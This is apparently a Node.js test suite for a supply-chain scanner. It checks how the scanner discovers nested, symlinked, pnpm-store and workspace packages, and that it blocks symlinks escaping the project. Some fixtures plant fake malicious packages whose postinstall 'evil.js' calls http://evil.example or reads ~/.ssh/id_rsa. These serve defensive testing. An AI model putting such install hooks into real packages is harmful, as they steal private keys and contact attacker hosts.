'use strict';

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');

const { mkTmpDir, writePackage, runCli } = require('./helpers');

function scanTree(nodeModulesDir) {
  const outDir = path.join(fs.mkdtempSync(path.join(nodeModulesDir, '..', 'out-')), 'manifests');
  const res = runCli(['scan-tree', nodeModulesDir, '--out', outDir]);
  const names = fs.readdirSync(outDir).filter((f) => f.endsWith('.json')).map((f) => f.replace(/\.json$/, ''));
  return { res, outDir, names };
}

describe('package discovery (scan-tree)', () => {
  // Regression test for a real gap found by testing against an actual
  // `npm install`: npm nests a dependency's own node_modules when a
  // transitive version conflict forces it (a completely ordinary, common
  // outcome, not a contrived edge case). The original discovery logic
  // only ever listed the immediate children of the given root, so anything
  // nested was invisible to scan-tree, baseline, and check alike.
  test('finds a package nested inside another package\'s own node_modules', () => {
    const tmp = mkTmpDir('nested');
    const nm = path.join(tmp, 'node_modules');
    writePackage(tmp, 'node_modules/outer', { name: 'outer', version: '1.0.0' }, {
      'index.js': "module.exports = require('inner');\n",
    });
    writePackage(
      tmp,
      'node_modules/outer/node_modules/inner',
      { name: 'inner', version: '1.0.0', scripts: { postinstall: 'node evil.js' } },
      { 'evil.js': "require('https').get('http://evil.example');\n" }
    );
    const { names } = scanTree(nm);
    assert.ok(names.includes('outer@1.0.0'));
    assert.ok(names.includes('inner@1.0.0'), 'nested package must be discovered');
  });

  // Regression test for a real gap: `fs.readdirSync(..., {withFileTypes:
  // true})` reports a symlink's Dirent.isDirectory() as false even when the
  // symlink points at a directory. Every package installed via a `file:`
  // dependency, npm/yarn workspace, or `npm link` is reached through such a
  // symlink under node_modules, and pnpm's ENTIRE node_modules layout is
  // symlinks into its content-addressed store. The original discovery
  // logic silently skipped all of them.
  test('finds a symlinked package (file: dependency / npm link / workspace)', () => {
    const tmp = mkTmpDir('symlink');
    const nm = path.join(tmp, 'node_modules');
    const realPkg = writePackage(tmp, 'actual-location/linked-pkg', {
      name: 'linked-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'node evil.js' },
    }, { 'evil.js': "require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n" });
    fs.mkdirSync(nm, { recursive: true });
    fs.symlinkSync(realPkg, path.join(nm, 'linked-pkg'), 'dir');

    const { names } = scanTree(nm);
    assert.ok(names.includes('linked-pkg@1.0.0'), 'symlinked package must be discovered');
  });

  test('finds a scoped symlinked package (@scope/name)', () => {
    const tmp = mkTmpDir('scoped-symlink');
    const nm = path.join(tmp, 'node_modules');
    const realPkg = writePackage(tmp, 'actual-location/scoped-pkg', { name: '@acme/scoped-pkg', version: '2.0.0' });
    fs.mkdirSync(path.join(nm, '@acme'), { recursive: true });
    fs.symlinkSync(realPkg, path.join(nm, '@acme', 'scoped-pkg'), 'dir');

    const { names } = scanTree(nm);
    assert.ok(names.includes('@acme__scoped-pkg@2.0.0'));
  });

  // pnpm keeps real package contents under node_modules/.pnpm/<name>@<version>/
  // node_modules/<name>, and symlinks top-level node_modules/<name> into that
  // store. Transitive (non-hoisted) dependencies are ONLY reachable by
  // walking .pnpm directly, since pnpm deliberately does not flatten them.
  test('finds packages in a pnpm-style .pnpm store, including transitive-only deps', () => {
    const tmp = mkTmpDir('pnpm');
    const nm = path.join(tmp, 'node_modules');
    const realA = writePackage(tmp, 'node_modules/.pnpm/pkg-a@1.0.0/node_modules/pkg-a', {
      name: 'pkg-a',
      version: '1.0.0',
    });
    // pkg-a's own dependency, reachable only through .pnpm (not hoisted to
    // the top-level node_modules at all, the realistic pnpm default).
    writePackage(tmp, 'node_modules/.pnpm/pkg-b@2.0.0/node_modules/pkg-b', {
      name: 'pkg-b',
      version: '2.0.0',
      scripts: { postinstall: 'node evil.js' },
    }, { 'evil.js': "require('https');\n" });
    fs.mkdirSync(nm, { recursive: true });
    fs.symlinkSync(realA, path.join(nm, 'pkg-a'), 'dir');

    const { names } = scanTree(nm);
    assert.ok(names.includes('pkg-a@1.0.0'));
    assert.ok(names.includes('pkg-b@2.0.0'), 'transitive-only pnpm dependency must be discovered via .pnpm');
  });

  test('a symlink cycle does not hang or crash discovery', () => {
    const tmp = mkTmpDir('cycle');
    const nm = path.join(tmp, 'node_modules');
    fs.mkdirSync(path.join(nm, 'a', 'node_modules'), { recursive: true });
    fs.mkdirSync(path.join(nm, 'b', 'node_modules'), { recursive: true });
    fs.writeFileSync(path.join(nm, 'a', 'package.json'), JSON.stringify({ name: 'a', version: '1.0.0' }));
    fs.writeFileSync(path.join(nm, 'b', 'package.json'), JSON.stringify({ name: 'b', version: '1.0.0' }));
    fs.symlinkSync(path.join(nm, 'b'), path.join(nm, 'a', 'node_modules', 'b'), 'dir');
    fs.symlinkSync(path.join(nm, 'a'), path.join(nm, 'b', 'node_modules', 'a'), 'dir');

    const { res, names } = scanTree(nm);
    assert.equal(res.status, 0);
    assert.ok(names.includes('a@1.0.0'));
    assert.ok(names.includes('b@1.0.0'));
  });

  // Regression test for a real gap: loadManifestsFromDir used to build a
  // Map keyed only by package name, so when the same name legitimately
  // appears at two different installed versions (exactly what nested
  // resolution produces), the second manifest read silently overwrote the
  // first in memory, dropping it from both baseline and check with no
  // warning.
  test('two different installed versions of the same package name are both scanned, not collapsed', () => {
    const tmp = mkTmpDir('dup-name');
    const nm = path.join(tmp, 'node_modules');
    writePackage(tmp, 'node_modules/lodash', { name: 'lodash', version: '4.17.21' });
    writePackage(tmp, 'node_modules/dep-a/node_modules/lodash', { name: 'lodash', version: '3.10.1' });
    const { names } = scanTree(nm);
    assert.ok(names.includes('lodash@4.17.21'));
    assert.ok(names.includes('lodash@3.10.1'), 'both installed versions must produce separate manifests');
  });

  test('.bin directory entries are not treated as packages', () => {
    const tmp = mkTmpDir('bin-dir');
    const nm = path.join(tmp, 'node_modules');
    fs.mkdirSync(path.join(nm, '.bin'), { recursive: true });
    fs.writeFileSync(path.join(nm, '.bin', 'somebinary'), '#!/usr/bin/env node\n');
    writePackage(tmp, 'node_modules/real-pkg', { name: 'real-pkg', version: '1.0.0' });
    const { names } = scanTree(nm);
    assert.deepEqual(names, ['real-pkg@1.0.0']);
  });

  test('scan-tree fails loudly (non-zero exit) on a nonexistent root, instead of silently scanning zero packages', () => {
    const res = runCli(['scan-tree', '/definitely/does/not/exist/node_modules', '--out', '/tmp/should-not-be-created-xyz']);
    assert.notEqual(res.status, 0);
    assert.match(res.stderr, /not found/);
  });

  // Security regression test, added after a code-review pass on the
  // symlink-following discovery fix reproduced a real path escape: a
  // package's own node_modules is exactly where its postinstall script can
  // plant a symlink, and following it unbounded let scan-tree read and
  // report on arbitrary filesystem locations outside the project, the
  // scanner itself becoming a confused deputy for the kind of compromised
  // package it exists to catch. Fixed by bounding symlink targets to the
  // project directory (the parent of the scan root).
  describe('symlink boundary enforcement', () => {
    test('a symlink resolving outside the project is not followed or scanned', () => {
      const tmp = mkTmpDir('escape');
      const outsideDir = mkTmpDir('escape-target');
      fs.writeFileSync(path.join(outsideDir, 'secret.txt'), 'super-secret-outside-content\n');
      const nm = path.join(tmp, 'node_modules');
      writePackage(tmp, 'node_modules/evil-pkg', { name: 'evil-pkg', version: '1.0.0' });
      fs.mkdirSync(path.join(nm, 'evil-pkg', 'node_modules'), { recursive: true });
      fs.symlinkSync(outsideDir, path.join(nm, 'evil-pkg', 'node_modules', 'escape-hatch'), 'dir');

      const { res, names } = scanTree(nm);
      assert.ok(names.includes('evil-pkg@1.0.0'));
      assert.ok(!names.some((n) => n.startsWith('escape-hatch')), 'the out-of-project symlink target must not be scanned');
      assert.match(res.stderr, /WARNING/);
      assert.match(res.stderr, /escape-hatch/);
      // An escape attempt must fail the run (non-zero exit), not just log a
      // warning that a CI pipeline checking only the exit code would miss,
      // "a package tried to symlink outside its project" is itself a
      // meaningful signal that this tool exists to surface.
      assert.notEqual(res.status, 0);
    });

    test('a legitimate sibling-directory symlink (workspace-style) inside the project is still followed', () => {
      const tmp = mkTmpDir('workspace');
      const nm = path.join(tmp, 'node_modules');
      const realPkg = writePackage(tmp, 'packages/workspace-pkg', { name: 'workspace-pkg', version: '1.0.0' });
      fs.mkdirSync(nm, { recursive: true });
      fs.symlinkSync(realPkg, path.join(nm, 'workspace-pkg'), 'dir');

      const { names } = scanTree(nm);
      assert.ok(names.includes('workspace-pkg@1.0.0'), 'a symlink to a sibling directory within the project must still work');
    });

    // Regression test for a real coverage gap found in review: the
    // default boundary (one level up from the scan root) is correct when
    // scanning a monorepo's top-level node_modules, but too tight when
    // scan-tree is instead pointed at a WORKSPACE MEMBER's own
    // node_modules (packages/app/node_modules), a completely standard way
    // to invoke it. A sibling workspace symlink (packages/shared) then
    // resolves one level above that tight boundary and was wrongly
    // excluded as an "escape". Fixed by walking up from the scan root to
    // find an actual workspace-root marker (package.json#workspaces or
    // pnpm-workspace.yaml) and using that as the boundary when found.
    test('scanning a workspace member\'s own node_modules still finds a sibling workspace package via workspace-root detection', () => {
      const tmp = mkTmpDir('workspace-member-scan');
      fs.writeFileSync(
        path.join(tmp, 'package.json'),
        JSON.stringify({ name: 'monorepo-root', private: true, workspaces: ['packages/*'] })
      );
      const sharedPkg = writePackage(tmp, 'packages/shared', { name: 'shared-lib', version: '1.0.0' });
      writePackage(tmp, 'packages/app', { name: 'app', version: '1.0.0' });
      const appNm = path.join(tmp, 'packages/app/node_modules');
      fs.mkdirSync(appNm, { recursive: true });
      fs.symlinkSync(sharedPkg, path.join(appNm, 'shared-lib'), 'dir');

      const { res, names } = scanTree(appNm);
      assert.equal(res.status, 0, 'must not be treated as an escape attempt');
      assert.ok(!res.stderr.includes('WARNING'));
      assert.ok(names.includes('shared-lib@1.0.0'), 'sibling workspace package must be discovered, not dropped as a false escape');
    });
  });
});
